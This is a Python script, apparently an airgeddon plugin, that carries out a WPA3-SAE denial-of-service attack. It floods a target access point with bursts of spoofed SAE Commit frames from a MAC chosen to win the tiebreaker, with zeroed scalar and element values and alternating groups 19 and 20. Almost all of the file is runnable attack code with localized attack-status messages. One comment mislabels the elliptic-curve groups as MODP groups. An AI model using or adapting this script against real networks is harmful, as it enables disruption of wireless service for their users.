#!/usr/bin/env python3
"""
WPA3-SAE Group Mismatch Tiebreaker Deadlock Engine for airgeddon plugin.
Features: Numeric greater MAC spoofing
"""
import sys
import os
import time
import random
from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC, sendp

ARR = {
    "ENGLISH": {
        0: "Deadlock attack running on {iface} | {bssid} | channel {channel}",
        1: "Burst {count}: sent {frames} frames with MAC {mac} (Group {group})",
        2: "Attack stopped."
    },
    "GERMAN": {
        0: "Deadlock-Angriff läuft auf {iface} | {bssid} | Kanal {channel}",
        1: "Burst {count}: {frames} Frames gesendet (MAC: {mac}, Gruppe {group})",
        2: "Angriff gestoppt."
    },
    "SPANISH": {
        0: "Ataque de Deadlock en {iface} | {bssid} | canal {channel}",
        1: "Burst {count}: enviado {frames} tramas con MAC {mac} (Grupo {group})",
        2: "Ataque detenido."
    },
    "FRENCH": {
        0: "Attaque de Deadlock en cours sur {iface} | {bssid} | canal {channel}",
        1: "Burst {count}: envoyé {frames} trames avec MAC {mac} (Groupe {group})",
        2: "Attaque arrêtée."
    },
    "PORTUGUESE": {
        0: "Ataque de Deadlock em {iface} | {bssid} | canal {channel}",
        1: "Burst {count}: enviado {frames} quadros com MAC {mac} (Grupo {group})",
        2: "Ataque interrompido."
    },
    "RUSSIAN": {
        0: "Атака Deadlock на {iface} | {bssid} | канал {channel}",
        1: "Burst {count}: отправлено {frames} пакетов с MAC {mac} (Группа {group})",
        2: "Атака остановлена."
    },
    "GREEK": {
        0: "Επίθεση Deadlock σε {iface} | {bssid} | κανάλι {channel}",
        1: "Burst {count}: απεστάλησαν {frames} frames με MAC {mac} (Ομάδα {group})",
        2: "Η επίθεση σταμάτησε."
    },
    "ITALIAN": {
        0: "Attacco Deadlock in corso su {iface} | {bssid} | canale {channel}",
        1: "Burst {count}: inviati {frames} frame con MAC {mac} (Gruppo {group})",
        2: "Attacco fermato."
    },
    "POLISH": {
        0: "Atak Deadlock uruchomiony na {iface} | {bssid} | kanał {channel}",
        1: "Burst {count}: wysłano {frames} ramek z MAC {mac} (Grupa {group})",
        2: "Atak zatrzymany."
    },
    "TURKISH": {
        0: "Deadlock saldırısı çalışıyor: {iface} | {bssid} | kanal {channel}",
        1: "Burst {count}: {mac} MAC ile {frames} çerçeve gönderildi (Grup {group})",
        2: "Saldırı durduruldu."
    },
    "ARABIC": {
        0: "هجوم Deadlock يعمل على {iface} | {bssid} | القناة {channel}",
        1: "Burst {count}: تم إرسال {frames} إطار بـ MAC {mac} (مجموعة {group})",
        2: "توقف الهجوم."
    },
    "CHINESE": {
        0: "Deadlock 攻击正在运行 {iface} | {bssid} | 信道 {channel}",
        1: "Burst {count}: 已发送 {frames} 个帧，MAC 为 {mac} (组 {group})",
        2: "攻击已停止。"
    },
    "CATALAN": {
        0: "Atac de Deadlock a {iface} | {bssid} | canal {channel}",
        1: "Burst {count}: enviat {frames} trames amb MAC {mac} (Grup {group})",
        2: "Atac aturat."
    }
}

BURST_SIZE = 128
INTERFRAME_DELAY = 0.0001

def msg(lang, key, **kw):
    template = ARR.get(lang, {}).get(key, ARR["ENGLISH"].get(key, ""))
    return template.format(**kw) if kw else template

def get_greater_mac(target_bssid):
    """Generate a random unicast MAC address that is numerically strictly greater than the target BSSID."""
    bssid_val = int(target_bssid.replace(":", ""), 16)
    while True:
        candidate = str(RandMAC())
        first_byte = int(candidate[:2], 16)
        # Ensure it's a unicast address (LSB of first byte is 0)
        if (first_byte & 1) == 0:
            candidate_val = int(candidate.replace(":", ""), 16)
            if candidate_val > bssid_val:
                return candidate

def build_deadlock_commit(bssid, mac_src, mismatch_group):
    """Construct a SAE Commit frame targeting a mismatched MODP group with null scalar/element."""
    group_bytes = mismatch_group.to_bytes(2, "little")
    
    # IEEE 802.11-2020 MODP group definitions (scalar_len, element_len)
    if mismatch_group == 20:
        slen, elen = (48, 96)
    else:
        slen, elen = (32, 64)
        
    # Invalid payload: all zeros to trigger validation failure after tiebreaker
    scalar = b'\x00' * slen
    element = b'\x00' * elen
    
    payload = group_bytes + scalar + element
    
    return (
        RadioTap() /
        Dot11(type=0, subtype=11, addr1=bssid, addr2=mac_src, addr3=bssid) /
        Dot11Auth(algo=3, seqnum=1, status=0) /
        payload
    )

def set_channel(iface, channel):
    os.system(f"iw dev {iface} set channel {channel} >/dev/null 2>&1")

def main():
    if len(sys.argv) < 4:
        print("Usage: deadlock_attack.py <bssid> <channel> <interface> [language]")
        time.sleep(5)
        sys.exit(1)

    bssid = sys.argv[1].lower()
    channel = sys.argv[2]
    interface = sys.argv[3]
    language = sys.argv[4] if len(sys.argv) > 4 else "ENGLISH"

    set_channel(interface, channel)
    print(msg(language, 0, iface=interface, bssid=bssid, channel=channel), flush=True)
    
    burst_count = 0
    
    # Alternate between group 20 and 19 to maximize deadlock probability
    group_cycle = [20, 19]
    group_index = 0

    try:
        while True:
            try:
                packets = []
                target_group = group_cycle[group_index % len(group_cycle)]
                group_index += 1
                
                attacker_mac = get_greater_mac(bssid)
                for _ in range(BURST_SIZE):
                    pkt = build_deadlock_commit(bssid, attacker_mac, target_group)
                    packets.append(pkt)
                
                # Transmit burst
                sendp(packets, iface=interface, verbose=False, inter=INTERFRAME_DELAY)
                burst_count += 1
                
                m = msg(language, 1, count=burst_count, frames=len(packets), mac=attacker_mac, group=target_group)
                print(f"\r{m}", end="", flush=True)
                
            except OSError:
                time.sleep(0.001)  # Minimal backoff on buffer exhaustion
                continue
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(1)  # Safe fallback for unexpected errors
                
    except KeyboardInterrupt:
        pass
    finally:
        print(f"\n{msg(language, 2)}")

if __name__ == "__main__":
    main()
